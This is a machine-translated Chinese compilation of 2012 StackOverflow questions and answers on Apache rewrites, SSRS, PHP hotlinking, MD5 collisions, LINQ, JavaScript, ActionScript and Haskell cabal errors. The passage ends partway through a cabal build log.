# StackOverflow 问答 12068000-12068999

# apache - apache用一些复杂的查询字符串重写

> ID：12068005
> 
> 赞同：1
> 
> 时间：2012-08-22T07:13:14.873
> 
> 标签：apache, rewrite

我想重写一些东西

```
www.domain.com/index.php?search=product/model&model_name={query string} 
```

至

```
www.domain.com/{query string}.html 
```

这是我的重写代码，但不起作用，需要帮助，谢谢。

```
RewriteRule ^index.php?search=product/model&model_name=(.*)$ index.php/$1.html 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:38:35.057

您无法匹配 a 中的查询字符串`RewriteRule`，您需要使用 a`RewriteCond`并匹配`%{QUERY_STRING}`var：

```
RewriteCond %{QUERY_STRING} ^search=product/model&model_name=(.*)$
RewriteRule ^/?index.php$ index.php/%1.html [L] 
```

这使得当有人请求时`www.domain.com/index.php?search=product/model&model_name={query string}`，他们会`/index.php/{query string}.html`在地址栏中的浏览器 URL 不变（仍然是带有查询字符串的 URL）时获得内容。

# service - SQLServer SSRS 2008/2012

> ID：12068008
> 
> 赞同：1
> 
> 时间：2012-08-22T07:13:20.240
> 
> 标签：service, reporting-services, reporting

设想：

存储过程中按销售人员分组的 90 天销售数据。

制表符：

单个汇总计算，例如 30 天实现的毛利润（销售成本 = GP）

迷你图：

显示 90 天内每天获得 GP 的迷你图。

问题：

这是如何在 SSRS 中完成的？

非常感谢您的建议和建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T04:45:42.730

假设您的数据集看起来像这样：

```
SalesPerson  Day   Sales
Person1      Day1  10
Person1      Day2  15
Person1      Day3  40
Person1      Day4  20
Person1      Day1  10
Person1      Day1  12 
```

您可以创建如下图所示的矩阵报告：![矩阵组图像](../Images/02389a0a4692ce86b3c17460ef09e086.png)

行分组在 SalesPerson (Employee) 列分组在 Day（因此将在 90 天内重复）

将迷你图对象拖到最后一列。诀窍是您不能将迷你图添加到详细信息行。如果需要，您可以更改详细信息组，以便它对每行中不同的内容进行分组（实际上根本不分组）。

像这样设置迷你图属性：![迷你图属性图像](../Images/326869b9af907a88a5c3aa98c112f115.png)

因此，Day 位于类别中，Sales 值位于 SUM 值中。

完毕！简单的 ：）

![迷你图预览](../Images/7094bc27824d1c6074be11ec334bbd95.png)

# php - PHP 文件托管

> ID：12068010
> 
> 赞同：2
> 
> 时间：2012-08-22T07:13:25.840
> 
> 标签：php, image, file, hosting

我需要您对我的网站[http://usb-online.fr](http://usb-online.fr)的帮助。这是一个 php 文件托管网站，这是下载内容的一部分：

```
header("Content-Type: $mime; name=\"$fichier\"");
header("Content-Transfer-Encoding: binary");
header("Content-Length: $taille");
header('Content-Description: Fichier hebergé par usb-online.fr');
header("Content-Disposition: attachment; filename=\"$fichier\"");
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Pragma: public');

ob_clean();
flush();
log_download($file,$infos['auteur'],$taille);
bunzip2($path); 
```

如果你试试这个 url： [http](http://usb-online.fr/file-download-822MjYzMg.html) ://usb-online.fr/file-download-822MjYzMg.html 你会看到一个下载框打开并且没有显示图像，这就是我想要的。但是用户`<img src="http://usb-online.fr/file-download-822MjYzMg.html"/>`在网站上做的，他可以显示图像，我的服务器变得很忙。我不想让这个，我该怎么办？ [http://usb-online.fr/file-download-822MjYzMg.html](http://usb-online.fr/file-download-822MjYzMg.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:17:02.647

您指的是所谓的“Hotlinking”，有几种方法可以禁用它。

这里描述了哪种适用于您的情况；[http://safalra.com/programming/php/prevent-hotlinking/](http://safalra.com/programming/php/prevent-hotlinking/)否则在 Google 上可以找到很多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:19:40.027

在您的会话中添加一个随机数。使用该随机数作为您要保护的图像的 URL 的一部分。当您收到图像请求时，仅在提供用户的 nonce 时才回复。

随机数本质上是一些随机位，可以是数字，也可以是字符串。随机数通常用于防止 CSRF 攻击。在这种情况下，您创建一个新的随机随机数并将其存储在用户的会话中。让我们使用“asdfgh”作为这个例子的随机数。然后使用类似的东西

```
<img src="yoururl.php?n=asdfgh"> 
```

在 yoururl.php 中，检查请求中的 n 值是否与存储在用户会话中的 nonce 匹配。没有匹配，没有图像。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T07:56:40.583

我不确定你能做你想做的事。如果您允许浏览器访问 URL，则无法控制它对远程端数据的处理方式。

# php - 哈希的 md5 哈希

> ID：12068015
> 
> 赞同：0
> 
> 时间：2012-08-22T07:13:54.030
> 
> 标签：php, security, hash, md5, md5-file

这是理论上的问题，但我很好奇。如果我这样做（PHP 中的代码，但在这种情况下语言并不重要）怎么办：

```
$value  = ''; //starting value
$repeat = false;

while(true)
{

     $value = md5($value);

     /*Save values in database, one row per value*/

     /*Check for repeated hash value in db, and set $repeat flag true if there is one*/

     if($repeat)break;    
} 
```

如您所见，我怀疑会有重复的哈希值。我认为每个现有文本都没有自己的价值，因为这应该意味着每个哈希值都有自己的价值，这没有意义。

我的问题是：那里有关于这个“问题”的文章吗？例如，当我对文件进行哈希处理以检查它们是否有效时，我可能会在一个系统中获得相同的值？这会在任何系统的任何地方引起问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:21:33.380

如果您关心多个文本散列到相同的值，请不要使用 MD5。MD5 有快速的碰撞攻击，这违反了你想要的属性。请改用 SHA-2。

当使用安全散列函数时，128 个散列的冲突极难找到，我的意思是我不知道它发生的情况。但是，如果您想避免这种机会，只需使用 256 位哈希。然后使用蛮力找到碰撞现在超出了全人类的计算能力。特别是没有已知的消息对`SHA-256(m1) == SHA-256(m2)`与`m1 != m2`.

你是对的，哈希不能是唯一的（参见[Pidgeonhole 原理](http://en.wikipedia.org/wiki/Pigeonhole_principle)），但你真正找到这种情况的机会非常低。所以不要为处理这种情况而烦恼。

我通常以 128 位安全级别为目标，因此当我需要无冲突哈希函数时，我使用 256 位哈希函数，例如 SHA-256。

* * *

使用您的哈希链，除非您愿意等待很*长时间*，否则您不会发现冲突。一旦你有大约 2^(n/2) 次，就可能发生冲突，对于 128 位散列（例如 md5），这是 2^64。我知道没有针对 128 位哈希的暴力冲突。我知道的唯一冲突是精心设计的消息，这些消息利用了您使用的散列方案中的弱点（那些针对 md5 存在的）。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-08-22T07:28:31.387

通过相同的方法或不同的方法对其进行多次哈希，然后几乎不可能重复它自己，还要检查它们是否重复然后重复哈希函数直到值不同，然后保存在数据库中或在任何你喜欢的地方使用它。 ..

# c++ - 在 C++ 中为 iOS 选择 3D 引擎

> ID：12068018
> 
> 赞同：1
> 
> 时间：2012-08-22T07:14:05.267
> 
> 标签：c++, ios, 3d, marmalade

再会。

目前我正在寻找用 C++ 编写的 iOS 3D 引擎，其功能与 Marmalade 一样强大，但我不知道该选择哪个。

为什么选择 C++？我需要它是跨平台的（用于未来的计划）。为什么不是橘子酱？如果我使用 Marmalade，就意味着我不能再使用我最喜欢的 Objective-C 库和框架了。我想使用 XCode 制作界面/网络/全部，并且只有一个屏幕将包含 3D 场景（我需要在这里做很多事情。着色器、CSG、纹理遮罩、布尔操作、程序网格生成等）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:30:20.637

Unity 是一个非常流行的 iOS 3d 引擎。看看： [http ://unity3d.com](http://unity3d.com)

您还可以查看 Cocos 3d，它是用 C++ 编写的 Cocos 2d 的扩展。 [http://brenwill.com/cocos3d/](http://brenwill.com/cocos3d/)

您还可以查看[http://irrlicht.sourceforge.net](http://irrlicht.sourceforge.net)

您还可以在这些帖子中找到一些信息： [https ://gamedev.stackexchange.com/questions/21/easy-to-use-cross-platform-3d-engines-for-c-game-development](https://gamedev.stackexchange.com/questions/21/easy-to-use-cross-platform-3d-engines-for-c-game-development)

[面向爱好者开发者的跨平台 3D 游戏引擎？](https://stackoverflow.com/questions/11139580/cross-platform-3d-game-engine-for-hobbyist-developers)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-24T17:08:10.093

因为你提到了Objective-C，所以我想我不得不提一下。目前据我所知，三家公司正在尝试在 Android 上提供基于 Objective-C 的 3D 引擎。根据定义，它将在 iOS 上得到原生支持。

*   [http://www.yeecco.com/stella/features](http://www.yeecco.com/stella/features)

    该公司已经发布了该产品，但不确定支持设备的稳定性或范围。可以肯定的是，这支持三星设备，因为它们是由三星赞助的。地点或开发商未知，也没有展示。

*   [http://www.apportable.com](http://www.apportable.com)

    这家公司还没有发布，但非常有前途。如您所见，他们列出了几款通过其 beta 产品移植到 Android 的著名 iOS 游戏。此外，他们的网站上有更多信息。

*   [http://www.madewithmarmalade.com/ko/juice](http://www.madewithmarmalade.com/ko/juice)

    Marmalade 还为多个平台（包括 Android）发布了一款名为 Juice 的 iOS 工具，它可以让 Objective-C 游戏在 Android 上运行。

# android - 从另一个应用程序更改一个应用程序首选项

> ID：12068031
> 
> 赞同：1
> 
> 时间：2012-08-22T07:14:57.420
> 
> 标签：android, share, sharedpreferences

我有两个应用程序，我希望一个应用程序更改另一个应用程序中的首选项。

是否可以？如果是这样，那怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:24:17.233

这意味着您需要在两个应用程序之间进行一些通道。如果 A 应用程序提供内容提供者，则 B 应用程序可以访问该内容提供者并更改该提供者中的值。看看这篇文章[http://developer.android.com/guide/topics/providers/content-providers.html](http://developer.android.com/guide/topics/providers/content-providers.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:24:29.150

您可以使用内容提供者。将您的设置放入数据库中，以便其他应用程序可以读取。

# c# - 使用 Linq 将数字增加 1 插入数据库

> ID：12068032
> 
> 赞同：1
> 
> 时间：2012-08-22T07:14:59.027
> 
> 标签：c#, asp.net, linq, sql-server-2008

如果可能的话，我想在应用程序端增加一个数字并使用 c# 和 Linq 保存到数据库中。

例如，我有一个像这样的表：

```
|id|text|version|
-----------------
 1  hello   1
 2  hello   1 
```

将新记录插入此表时，我想获取当前版本号并递增 1，然后插入新行

```
|id|text|version|
-----------------
 1  hello   1
 2  hello   1
 1  hello   2 
```

我可以使用 linq 进行标准插入，但显然坚持使用版本

```
DataContext db = new DataContext

using (db)
{
    table t = new table
      {
         text = TextBox1.Text
         version = ??
      };

db.table.InsertOnSubmit(t);
db.SubmitChanges();
} 
```

我可以以某种方式选择行并获取当前版本号，然后只增加 1 吗？还是我应该重新考虑我的方法？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:37:41.567

首先，您需要将此逻辑包装在事务中；它将锁定表格，您将避免并发问题。之后，您可以选择版本的最大值并将其加一。

```
using(var scope = new TransactionScope(TransactionScopeOption.Required,
                      new TransactionOptions{IsolationLevel = IsolationLevel.Serializable}))
{
    using(var dataContext = new DataContext())
    {
        var version = dataContext.Table.Where(item => item.Text == textBox1.Text)
                                       .Max(item => item.Version);
        var t = new Table
        {
            Text = textBox1.Text,
            Version = version + 1
        };
        dataContext.Table.InsertOnSubmit(t);
        dataContext.SaveChanges();
        scope.Complete();
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:32:55.847

**使用 SQL 存储过程**

我可以向您建议一种在 sql server 中执行此操作的方法。使用 SQL 存储过程。如果你使用链接会有一个缺点，控件将运行很多次。

如果你想使用存储过程，试试这个

```
DECLARE @sno INT
IF((SELECT MAX(version) FROM Tbl) IS NULL)
SET @sno=0;
ELSE SET @sno=(SELECT MAX(version) FROM Tbl)

INSERT INTO Tbl (Id,Text,version)
VALUES (@id, @text, @sno) 
```

在上面的代码中，@sno 是可用的，它在开始时设置为 0 ，如果任何以前的版本号不存在，则版本设置为 0 。如果存在任何版本，则版本加一然后插入。

**使用 LINQ**

通过使用 LINQ，

```
var maxVer = dc.Logs.Max(s => s.Version); 
```

这给出了最大版本号。并使用它，您可以按照自己的方式插入数据库。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-29T10:43:17.577

我有权更改数据库结构，所以我只使用了 IDENTITY col。

# javascript - Javascript函数未触发 - 正文加载

> ID：12068033
> 
> 赞同：0
> 
> 时间：2012-08-22T07:15:00.770
> 
> 标签：javascript, drop-down-menu, onchange, onload

好的，所以我有一个包含以下内容的页面，该函数会创建一个下拉菜单，其中包含 q15 的信息：

当用户从下拉 q14 中选择一个选项时，会触发以下代码：

```
onchange="configureDropDownLists(this,'q15')" 
```

使用以下`onload`选项加载页面时调用相同的函数：

```
<body onload="configureDropDownLists('q14','q15');check();"> 
```

这是使用的两个函数：

```
function configureDropDownLists(q14,q15) {

        if (langu.languag=='English'){
            var not = new Array('');
            var australia = new Array('Perth','Brisbane','Sydney (Frenchs Forrest)','Sydney (Auburn)','Melbourne','Adelaide','Auckland');
            }

        switch (q14.value) {
            case '':
                document.getElementById(q15).options.length = 0;
                for (i = 0; i < not.length; i++) {
                    createOption(document.getElementById(q15), not[i], not[i]);
                }
                break;
            case '1':
                document.getElementById(q15).options.length = 0;
                for (i = 0; i < australia.length; i++) {
                    createOption(document.getElementById(q15), australia[i], [i+1]);
                }
                break;

        }

    }

    function createOption(ddl, text, value) {
        var opt = document.createElement('option');
        opt.value = value;
        opt.text = text;

        ddl.options.add(opt);
    } 
```

最后，这个乱七八糟的代码在`header`页面的部分：

```
<script type="text/javascript">

window.results = ["<?php echo implode ('","', $results); ?>"];

</script>
<script type="text/javascript">
function selected(){
    var res = 'test';
    document.getElementById("test").value = res;
    alert(res);
}
</script>
<script type="text/javascript">
    var langu = {
        languag : '<?php echo $lang; ?>'
     }
    </script>
<script src="main.js" type="text/javascript"></script>
<script src="javascripts/scriptaculous.shrunk.js" type="text/javascript" charset="ISO-8859-1"></script>
<script src="javascripts/page2_validation.js" type="text/javascript"> </script> 
```

`onchange`当用户选择 q14 时，代码会使用调用正确触发。此外，在 q14 上，如果用户之前访问过该页面，则 PHP 代码会自动选择一个选项 - 在这种情况下，我希望该函数在页面加载时运行并创建 q15，因此我尝试使用`onload`，但是，我根本无法让它着火。

欢迎任何想法和建议，请！H。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:18:04.597

“this”指的是选择，所以你需要传递一个选择对象

这样做而不是内联

```
window.onload=function() {
  configureDropDownLists(document.getElementById('q14'),'q15');
  check();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:19:30.040

当您打算传递一个元素时，您已将一个字符串作为 q14 传递。

话虽如此，如果你给我们一个 jsfiddle.net 工作区来修补，这将更容易调试。

# apache-flex - 为什么在 ActionScript 中将日期转换为日期会失败？

> ID：12068035
> 
> 赞同：3
> 
> 时间：2012-08-22T07:15:07.993
> 
> 标签：apache-flex, date, actionscript, types, casting

在 ActionScript 中，我发现，将 Date 转换为 Date 并将其分配给 Date 类型的变量会引发 TypeError：

```
var date : Date = Date(new Date(2012, 01, 01));

Error #1034: Type Coercion failed: cannot convert "Wed Aug 22 17:06:54 GMT+1000 2012" to Date. 
```

这显然是错误的，但我想知道为什么会这样。我的理论是 Date 强制转换，就像 Number 强制转换一样，已经被覆盖以尝试转换给定的类型，而不仅仅是强制转换它。

有趣的是，将任何其他内容转换为 Date 并将其分配给 Date 也会失败：

```
var date : Date = Date("1/2/3");
var date : Date = Date(123);

// (Both fail) 
```

但是将其分配给 Object 成功：

```
var object : Object = Date(new Date(2012, 01, 01));
var object : Object = Date("1/2/3");
var object : Object = Date(123);

// (All succeed) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T09:43:00.943

AS3 有时会非常混乱和不一致。基本上，您不会在该代码示例中强制转换任何内容。

AS3 有一些全局的 camelCased 函数，它们将优先于强制转换运算符。Vector也有类似的全局函数。

当您在没有 new 运算符的情况下执行 Date(bla) 时，它显然会创建该日期的字符串表示形式...尝试使用 as 运算符进行转换。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T11:31:16.960

通常你应该得到一个关于这个行为的编译器警告，如果编译器参数

```
<!-- Invalid Date cast operation. -->
<warn-bad-date-cast>true</warn-bad-date-cast> 
```

存在于您的[*flex-config.xml*](http://livedocs.adobe.com/flex/3/html/help.html?content=configuring_environment_3.html)中。

# facebook - Facebook 在抓取时更改了我的 URL 变量值？

> ID：12068039
> 
> 赞同：0
> 
> 时间：2012-08-22T07:15:39.197
> 
> 标签：facebook, url, web-scraping, canonical-link

好吧，这是一个奇怪的...

尝试通过 Facebook 调试器输入此 URL ( [http://dev.bride.ca/wedding-dresses/index.cfm?page=1&shopRegions=162&GownTypeID=1&maxGownPrice=1000&GownLabelID=12 )。](http://dev.bride.ca/wedding-dresses/index.cfm?page=1&shopRegions=162&GownTypeID=1&maxGownPrice=1000&GownLabelID=12)

在这里，只需点击：http: [//developers.facebook.com/tools/debug/og/object ?q=http%3A%2F%2Fdev.bride.ca%2Fwedding-dresses%2Findex.cfm%3Fpage%3D1% 26shopRegions%3D162%26GownTypeID%3D1%26maxGownPrice%3D1000%26GownLabelID%3D12](http://developers.facebook.com/tools/debug/og/object?q=http%3A%2F%2Fdev.bride.ca%2Fwedding-dresses%2Findex.cfm%3Fpage%3D1%26shopRegions%3D162%26GownTypeID%3D1%26maxGownPrice%3D1000%26GownLabelID%3D12)

看到奇怪的变化了吗？

当它创建要解析的规范 URL 时，它采用最后一个 URL 变量 ( *GownLabelID= **12*** ) 并将其更改为“ *GownLabelID= **0*** ”

实际上，它与前面的变量相同：*maxGownPrice=1000*变为*maxGownPrice= **0***

但它并没有对所有变量进行处理，只是对这两个变量进行处理。它不会对最后两个这样做。我交换了顺序并将最后一个移到了开头，它仍然对同一个变量进行了操作。

我没有想法..有人吗？

提前致谢！（*）这是在 DEV 服务器上，随意尝试不同的东西等。它对消费者或任何东西都不是“活”的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:38:59.900

> 当它创建一个要解析的规范 URL 时，它会采用最后一个 URL 变量 (GownLabelID=12) 并将其更改为“GownLabelID=0”

抓取工具不会“创建”规范 URL——它会从您页面的 OG 元标记中读取它们。

*你*是那个放

```
<meta property="og:url" content="http://dev.bride.ca/wedding-dresses/index.cfm?
page=1&shopRegions=162&GownTypeID=1&maxGownPrice=0&GownLabelID=0"/> 
```

进入页面的 HTML 代码 - 刮板只是按照你告诉它的内容。

# php - For 循环中的 If 语句 = 问题

> ID：12068041
> 
> 赞同：1
> 
> 时间：2012-08-22T07:15:49.847
> 
> 标签：php

出于某种原因，我的 if 语句没有按预期工作。

```
$query = "SELECT title FROM blog";
$result = mysql_query($query);
$rows = mysql_num_rows($result);

for ($j = 0; $j < $rows; ++$j)
{
    if (isset($_POST['$j']))
    {
        $id  = mysql_real_escape_string($_POST['id']);
        $query = "DELETE FROM blog WHERE id='$id'";
        mysql_query($query);
        echo 'Deleted post.. ';
        echo '<a href="blog.php">Click here</a>';
    }
    else
    {
        echo 'Failed!';
    }
} 
```

发生的事情是“已删除的帖子..”和“链接”与我在表格博客中的行数相呼应。我的表中只有一行被删除，但这是我想要的。每次按下一个按钮，所以它不应该只回显“已删除帖子..”和“失败！” 其余时间？谢谢 =)

注意：我还是编程新手，如果问题很愚蠢，对不起。

注意 2：我在另一页上有很多按钮。它们用数字“1、2、3”等标记。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:18:46.550

改变：

```
$_POST['$j'] // here, due to the single quotes you're
             // always testing for the literal `$j`, and not
             // the value of current loop iteration. 
```

到：

```
$_POST[$j] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:18:39.203

变量不是用单引号解析的，需要用双引号。`isset($_POST["$j"]`

此外，您还试图在循环中一遍又一遍地删除相同的记录，您正在检查是否 `$_POST["$j"]`已设置但使用`$_POST['id']`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:21:36.207

试试这个

```
<?php
    $query = "SELECT title FROM blog";
    $result = mysql_query($query);
    $rows = mysql_num_rows($result);

    for ($j = 0; $j < $rows; ++$j)
    {
        if (isset($_POST[$j]))
        {
            $id  = mysql_real_escape_string($_POST['id']);
            $query = "DELETE FROM blog WHERE id='" .$id ."'";
            mysql_query($query);
            echo 'Deleted post.. ';
            echo '<a href="blog.php">Click here</a>';
        }
        else
        {
            echo 'Failed!';
        }
    }

?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T07:26:11.420

问题是您正在循环通过 $_POST[0] 到 $_POST[Whatever]，但您只删除了 ID = $_POST['id'] 的位置。$_POST['id'] 永远不会改变。即使你一遍又一遍地循环，你仍然试图为每个循环删除同一行

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T07:29:21.353

它不会起作用，因为 POST 或 GET 或 REQUEST 只获取从前一页发布到当前页面的内容。

您需要将一些变量发布到某个页面，然后才可以使用`$_POST['j']`. 您不能在 POST 中使用当前页面中的变量

如果您`j`从其他页面发布，那么我认为您可以使用此条件而不是那样使用

```
$j = $_POST['j'];

if(isset($_POST['j'])){
for($j = 0; $j < $rows; ++$j){
//your code
}
} 
```

希望这可以帮助

# c# - 无法从 Web 应用程序中解压缩文件？

> ID：12068043
> 
> 赞同：0
> 
> 时间：2012-08-22T07:15:54.950
> 
> 标签：c#, asp.net-mvc, compression, unzip

我正在尝试使用 Ionic.Zip Dll 解压缩下载的文件。

我的代码在 Windows 应用程序中工作，但在我的 Web 应用程序中无法工作。

代码运行没有错误，但是当我检查文件夹时，仍然有没有提取的压缩下载文件。

Web应用程序需要执行此操作是否有任何特殊性？

```
 private void MyExtract()
        {
            string zipToUnpack = "C:\\Users\\Shaun\\Desktop\\RescommTestData\\downloadfile.zip";
            string unpackDirectory = "ExtractedFiles"; //used to create a file to extract files to
            using (ZipFile zip1 = ZipFile.Read(zipToUnpack))
            {
                // here, we extract every entry, but we could extract conditionally
                // based on entry name, size, date, checkbox status, etc.  
                foreach (ZipEntry e in zip1)
                {
                    e.Extract(unpackDirectory, ExtractExistingFileAction.OverwriteSilently);
                    // e.Extract(ExtractExistingFileAction.OverwriteSilently);
                }

            }
            try
            {
                //File.Delete("C:\\Users\\Shaun\\Desktop\\downloadfile.zip");
                MessageBox.Show("Unpacked photos and data file into ExtractedFiles folder in bin/Debug");
            }
            catch (Exception)
            {
                MessageBox.Show("Could not delete ZIP!");
                Environment.Exit(1);
            } 
```

# android - 蓝牙串口配置文件通信流

> ID：12068051
> 
> 赞同：0
> 
> 时间：2012-08-22T07:16:24.260
> 
> 标签：android, bluetooth, spp

我想通过蓝牙将视频从 ine 设备流式传输到另一个设备。我的设备不支持视频分发配置文件 (VDP)，因此我只能使用 SPP。可以吗？感谢 NinjAndroid MoMinis 研发团队

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T10:29:31.860

串行端口配置文件（以及一般的蓝牙）不够快，无法传输具有可观分辨率或质量的视频数据。

# backbone.js - jQuery添加一个位置：相对于我的元素使用backbone.js

> ID：12068052
> 
> 赞同：0
> 
> 时间：2012-08-22T07:16:30.017
> 
> 标签：backbone.js

我有一个奇怪的麻烦，我使用backbone.js 创建了一个简单的视图：

```
class MyApp.Views.Tools.TextBox extends Backbone.View
  template: JST['pdfs/tools/text_box']

  tagName: "div"

  className: "resizable"

  id: "resizable"

  events:
    'click .close': 'closeRect'

  initialize: ->
    @

  render: ->
    $(@el).html(@template())
    @initDraggable()
    this

  initDraggable: ->
    $(@el).resizable().draggable();
    #$(@el).css({"position": "absolute"})
    @

  closeRect: (event) =>
    console.log "pass" 
```

还有我的模板：

```
<div class="close">x</div>
<input type="text" name="text_' + @count++ + '" /> 
```

当我执行以下命令时：$(@el).resizable().draggable();，jQuery 将 style="position:relative" 添加到我的元素中。我知道为什么当我在 jQuery UI 上查看 Draggable 函数时：

```
if (this.options.helper == 'original' && !(/^(?:r|a|f)/).test(this.element.css("position")))
this.element[0].style.position = 'relative'; 
```

但我不明白为什么 this.element.css("position") 不返回我在元素上的 css 属性：position:absolute。

Backbone.js 是否可以在 css 之前加载 javascript 或者不使用我页面的 css？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-06T18:10:28.270

> 但我不明白为什么 this.element.css("position") 不返回我在元素上的 css 属性：position:absolute。

我很困惑; 正如您所指出的，jQuery 可拖动`position: relative`为其元素添加了一种样式。然后，您将其设置回`"position": "absolute"`... 但您将其注释掉了。

```
#$(@el).css({"position": "absolute"}) 
```

因此，它仍然存在的原因似乎`relative`是 jQuery 将其更改为`relative`并且您从未将其更改回来。

# haskell - cabal 无法更新并且“某些软件包无法安装”

> ID：12068055
> 
> 赞同：5
> 
> 时间：2012-08-22T07:16:36.740
> 
> 标签：haskell, cabal, cabal-install

我对 Haskell 世界很陌生，我想使用包[HaskellCharts](http://dockerz.net/twd/HaskellCharts)。要走的路似乎是使用 cabal，所以我`cabal-install`从我的存储库安装（我在 Ubuntu 10.04.4 LTS 32 位上）。

我的规格是：

```
$ ghc --version
The Glorious Glasgow Haskell Compilation System, version 6.12.1
$ which ghc
/usr/bin/ghc

$ cabal --version
cabal-install version 0.8.0
using version 1.8.0.2 of the Cabal library 
```

HaskellCharts 安装指南（截至 2010 年 5 月 27 日）告诉我

```
cabal update
cabal install gtk2hs-buildtools
cabal install gtk
cabal install chart 
```

`cabal update`成功并告诉我有更新版本的 cabal 可用。

```
$ cabal install gtk2hs-buildtools 
```

然而，产量

```
Resolving dependencies...
Downloading gtk2hs-buildtools-0.12.3.1...
Configuring gtk2hs-buildtools-0.12.3.1...
cabal: alex is required but it could not be found.
cabal: Error: some packages failed to install:
gtk2hs-buildtools-0.12.3.1 failed during the configure step. The exception
was:
ExitFailure 1 
```

所以我尝试先安装`alex`，但这也会导致错误，我无法确定其来源：

```
$ cabal install alex
Resolving dependencies...
Downloading alex-3.0.2...
[1 of 1] Compiling Main             ( /tmp/alex-3.0.219087/alex-3.0.2/Setup.lhs, /tmp/alex-3.0.219087/alex-3.0.2/dist/setup/Main.o )
Linking /tmp/alex-3.0.219087/alex-3.0.2/dist/setup/setup ...
Configuring alex-3.0.2...
Preprocessing executables for alex-3.0.2...
Building alex-3.0.2...
ghc: unrecognised flags: -rtsopts
Usage: For basic information, try the `--help' option.
cabal: Error: some packages failed to install:
alex-3.0.2 failed during the building phase. The exception was:
ExitFailure 1 
```

为了确保问题不会因包的过时版本/不兼容版本等引起，我尝试更新 cabal 本身。

```
$ cabal install cabal-install 
```

导致

```
Resolving dependencies...
Warning: network.cabal: Ignoring unknown section type: test-suite
Warning: network.cabal: Ignoring unknown section type: test-suite
Configuring network-2.3.1.0...
configure: WARNING: unrecognized options: --with-compiler
checking build system type... i686-pc-linux-gnu
checking host system type... i686-pc-linux-gnu
checking for gcc... gcc
checking whether the C compiler works... yes
checking for C compiler default output file name... a.out
checking for suffix of executables... 
checking whether we are cross compiling... no
checking for suffix of object files... o
checking whether we are using the GNU C compiler... yes
checking whether gcc accepts -g... yes
checking for gcc option to accept ISO C89... none needed
checking for an ANSI C-conforming const... yes
checking how to run the C preprocessor... gcc -E
checking for grep that handles long lines and -e... /bin/grep
checking for egrep... /bin/grep -E
checking for ANSI C header files... yes
checking for sys/types.h... yes
checking for sys/stat.h... yes
checking for stdlib.h... yes
checking for string.h... yes
checking for memory.h... yes
checking for strings.h... yes
checking for inttypes.h... yes
checking for stdint.h... yes
checking for unistd.h... yes
checking fcntl.h usability... yes
checking fcntl.h presence... yes
checking for fcntl.h... yes
checking limits.h usability... yes
checking limits.h presence... yes
checking for limits.h... yes
checking for stdlib.h... (cached) yes
checking for sys/types.h... (cached) yes
checking for unistd.h... (cached) yes
checking winsock2.h usability... no
checking winsock2.h presence... no
checking for winsock2.h... no
checking ws2tcpip.h usability... no
checking ws2tcpip.h presence... no
checking for ws2tcpip.h... no
checking wspiapi.h usability... no
checking wspiapi.h presence... no
checking for wspiapi.h... no
checking arpa/inet.h usability... yes
checking arpa/inet.h presence... yes
checking for arpa/inet.h... yes
checking netdb.h usability... yes
checking netdb.h presence... yes
checking for netdb.h... yes
checking netinet/in.h usability... yes
checking netinet/in.h presence... yes
checking for netinet/in.h... yes
checking netinet/tcp.h usability... yes
checking netinet/tcp.h presence... yes
checking for netinet/tcp.h... yes
checking sys/socket.h usability... yes
checking sys/socket.h presence... yes
checking for sys/socket.h... yes
checking sys/uio.h usability... yes
checking sys/uio.h presence... yes
checking for sys/uio.h... yes
checking sys/un.h usability... yes
checking sys/un.h presence... yes
checking for sys/un.h... yes
checking for readlink... yes
checking for symlink... yes
checking for struct msghdr.msg_control... yes
checking for struct msghdr.msg_accrights... no
checking for struct sockaddr.sa_len... no
checking for in_addr_t in netinet/in.h... yes
checking for SO_PEERCRED and struct ucred in sys/socket.h... yes
checking for _head_libws2_32_a in -lws2_32... no
checking for getaddrinfo... yes
checking for gai_strerror... yes
checking whether AI_ADDRCONFIG is declared... yes
checking whether AI_ALL is declared... yes
checking whether AI_NUMERICSERV is declared... yes
checking whether AI_V4MAPPED is declared... yes
checking whether IPV6_V6ONLY is declared... yes
checking for sendfile in sys/sendfile.h... yes
checking for sendfile in sys/socket.h... no
checking for gethostent... yes
checking for accept4... yes
configure: creating ./config.status
config.status: creating network.buildinfo
config.status: creating include/HsNetworkConfig.h
configure: WARNING: unrecognized options: --with-compiler
Preprocessing library network-2.3.1.0...
Building network-2.3.1.0...
[ 1 of 10] Compiling Network.URI      ( Network/URI.hs, dist/build/Network/URI.o )

Network/URI.hs:580:24:
    Couldn't match expected type `Char' against inferred type `[Char]'
      Expected type: GenParser Char () Char
      Inferred type: URIParser String
    In the first argument of `notFollowedBy', namely `regName'
    In a stmt of a 'do' expression: notFollowedBy regName
cabal: Error: some packages failed to install:
